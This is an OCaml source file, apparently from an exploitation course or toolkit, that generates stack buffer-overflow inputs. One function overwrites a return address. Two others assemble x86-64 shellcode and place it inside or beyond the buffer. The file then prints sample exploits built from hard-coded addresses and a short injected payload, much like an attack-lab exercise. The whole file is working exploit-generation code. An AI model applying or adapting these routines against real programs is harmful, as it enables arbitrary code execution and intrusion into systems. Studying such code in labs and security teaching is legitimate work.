open Octosyn
open Utils

(** Prepend additional zeros to a list of integers such that the resulting list
    has length 8 *)
let pad_adr l =
  l @ List.init (max 0 (8 - List.length l)) (fun _ -> 0)

(** Given a buffer size and an adress, [mini_exploit] generates an input string
    which exploit a buffer overflow to provoque the execution of
    the code at the given adress. *)
let mini_exploit buff_size call =
  let nop   = hex "aa" in
  let adr   = List.rev (parse_bytes call) |> pad_adr in
  let adrl  = List.length adr in
  let buff  = Array.make (buff_size + adrl) nop in
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

(** Given a buffer size, the text of an x86-64 assembly program (INTEL syntax) and 
    the adress of the last cell of the buffer, [exploit] generates
    an input string which exploit a buffer overflow
    to provoque the execution of the code.
    The payload is generated such that its machine code is injected outside of the buffer *)
let exploit_out buff_size payload call =
  let nop   = hex "aa" in
  let adr   = List.rev (parse_bytes call |> bytes_add 8) |> pad_adr in
  let asm   = Asm.asm payload in
  let pay   = Asm.asm_bytes asm in
  let payl  = Asm.asm_size asm in
  let buff  = Array.make (buff_size + 8 + payl) nop in
  Array.iteri (fun i x -> buff.(buff_size + 8 + i) <- x) pay;
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

(** Given a buffer size, the text of an x86-64 assembly program (INTEL syntax) and 
    the adress of the last cell of the buffer, [exploit] generates
    an input string which exploit a buffer overflow
    to provoque the execution of the code.
    The payload is generated such that its machine code is injected inside of the buffer *)
let exploit_in buff_size payload call =
  let nop   = hex "aa" in
  let asm   = Asm.asm payload in
  let pay   = Asm.asm_bytes asm in
  let payl  = Asm.asm_size asm in
  let adr   = List.rev (parse_bytes call |> bytes_add (-payl)) |> pad_adr in
  let buff  = Array.make (buff_size + 8) nop in
  Array.iteri (fun i x -> buff.(buff_size - payl + i) <- x) pay;
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

let _ = mini_exploit 56 "42 1d 6a"
        |> Asm.print_bytes 
        |> print_newline

let payload = "mov edi, 0x40c15130; push 0x00421d96; ret"

let _ = exploit_in 56 payload "55 61 3b f0"
        |> Asm.print_bytes
        |> print_newline 

let _ = exploit_out 56 payload "55 61 3b f0"
        |> Asm.print_bytes
        |> print_newline